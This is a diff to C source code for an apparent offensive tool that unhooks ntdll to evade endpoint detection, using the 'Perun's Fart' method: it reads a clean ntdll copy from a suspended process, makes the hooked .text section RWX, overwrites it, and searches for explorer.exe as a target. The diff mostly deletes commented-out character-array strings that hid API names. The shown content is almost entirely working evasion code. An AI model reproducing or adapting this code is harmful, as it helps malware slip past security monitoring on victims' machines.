@@ -129,11 +129,7 @@ void getTextSection(HMODULE hMod, IMAGE_SECTION_HEADER* textSection)
 BOOL unhook(HMODULE hookedDLL, LPVOID cleanDLL, DWORD protection)
 {
 	char* pBaseAddr = (char*)cleanDLL;
-	//LPVOID hDLL = (LPVOID)hookedDLL;
 	DWORD64 hDLL1 = (DWORD64)hookedDLL;
-	//char nt[] = { 'n','t','d','l','l','.','d','l','l', 0 };
-	//WCHAR masterDLL[] = { 'n','t','d','l','l','.','d','l','l',0 };
-	//char txt[] = { '.','t','e','x','t', 0 };
 	NTSTATUS success;
 	HANDLE hCurProc = (HANDLE)0xffffffffffffffff;
 	DWORD old = 0;
@@ -149,9 +145,6 @@ BOOL unhook(HMODULE hookedDLL, LPVOID cleanDLL, DWORD protection)
 		if (!strcmp((char*)cleanSectionHdr->Name, txt)) 
 		{
 			// we change the protection of hooked .text section
-			
-			//char protect[] = { 'N','t','P','r','o','t','e','c','t','V','i','r','t','u','a','l','M','e','m','o','r','y',0 };
-			//myNtProtectVirtualMemory pVirtualProtect = (myNtProtectVirtualMemory)hlpGetProcAddress(hlpGetModuleHandle(masterDLL), protect);
 			SIZE_T sizeOfTxtSec = sizeof(cleanSectionHdr->Misc.VirtualSize);
 			LPVOID hAddr = (LPVOID)(hDLL1 + cleanSectionHdr->VirtualAddress);
 			success = pVirtualProtect(hCurProc, &hAddr, (PULONG)&sizeOfTxtSec, 0x80, &protection); //we make the remote buffer RWX
@@ -163,8 +156,6 @@ BOOL unhook(HMODULE hookedDLL, LPVOID cleanDLL, DWORD protection)
 			
 
 			// we copy cleanDLL to hookedDLL
-			//char write[] = { 'N','t','W','r','i','t','e','V','i','r','t','u','a','l','M','e','m','o','r','y',0 };
-			//myNtWriteVirtualMemory pWriteMem = (myNtWriteVirtualMemory)hlpGetProcAddress(hlpGetModuleHandle(masterDLL), write);
 			success = pWriteMem((HANDLE)0xffffffffffffffff, hAddr, (PVOID)((DWORD64)cleanDLL + cleanSectionHdr->VirtualAddress), sizeOfTxtSec, (SIZE_T*)NULL);
 			printf("Location of hooked .text section: %p\n", hAddr);
 			if (success == 0x0)
@@ -183,10 +174,7 @@ BOOL unhook(HMODULE hookedDLL, LPVOID cleanDLL, DWORD protection)
 
 int FindTarget()
 {
-	//WCHAR masterDLL[] = { 'n','t','d','l','l','.','d','l','l',0 };
-	//WCHAR procName[] = { 'e','x','p','l','o','r','e','r','.','e','x','e',0 };
-	//char qu3rySyst3m[] = { 'N','t','Q','u','e','r','y','S','y','s','t','e','m','I','n','f','o','r','m','a','t','i','o','n',0 };
-	//NTSTATUS success;
+	
 	ULONG ProcId = 0;
 	myNtQuerySystemInformation penumProc = (myNtQuerySystemInformation)hlpGetProcAddress(hlpGetModuleHandle(masterDLL), qu3rySyst3m);
 
@@ -243,21 +231,17 @@ void perunfart(HANDLE hSusProc) {
 	HANDLE hCurProc = (HANDLE)0xffffffffffffffff;// handle to current process
 	DWORD oldPro = 0;
 
-	//WCHAR masterDLL[] = { 'n','t','d','l','l','.','d','l','l',0 };
-	//dllModule = hlpGetModuleHandle(masterDLL);
+	
 	DWORD dllSize1 = getSizeOfImage(dllModule);
 
 	// we allocate buffer for our dll at pRemoteCode
-	//char alloc[] = { 'N','t','A','l','l','o','c','a','t','e','V','i','r','t','u','a','l','M','e','m','o','r','y',0 };
 	SIZE_T dllSize = getSizeOfImage(dllModule);
-	//myNtAllocateVirtualMemory pAllocMem = (myNtAllocateVirtualMemory)hlpGetProcAddress(hlpGetModuleHandle(masterDLL), alloc);
 	success = pAllocMem(hCurProc, &pRemoteCode, 0, &dllSize, MEM_COMMIT, PAGE_READWRITE);
 	if (success == 0x0)
 		printf("[+] RW buffer created for dll: %p\n", pRemoteCode);
 
 	// read ntdll from the suspended process and copy to local process
 	PULONG bytesRead = NULL;
-	//hSusProc = pi.hProcess;
 	
 	success = pReadMem(hSusProc, (PVOID)dllModule, pRemoteCode, dllSize1, bytesRead);
 	if (success == 0x0)
